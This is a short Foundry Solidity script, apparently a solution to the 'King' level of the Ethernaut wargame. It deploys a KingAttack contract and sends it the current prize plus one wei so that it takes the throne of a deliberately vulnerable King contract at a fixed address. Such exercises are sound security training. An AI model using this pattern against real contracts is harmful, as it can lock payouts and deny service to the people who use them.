// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {KingAttack} from "../src/attacks/KingAttack.sol";
import {King} from "../src/levels/King.sol";

contract KingScript is Script {
    King public instance = King(payable(0xb47356CaDfd913306d1D8695898CeE4c493e8985));
    KingAttack public attacker;

    function run() external {
	vm.startBroadcast();
	attacker = new KingAttack();
	console.log("KingAttack Contract deployed to:", address(attacker));
	uint256 prize = instance.prize();
	console.log("Current prize:", prize);
	attacker.attack{value: prize + 1 wei}(address(instance));
	console.log("KingAttack Contract is now the new King!");
	vm.stopBroadcast();
    }
}
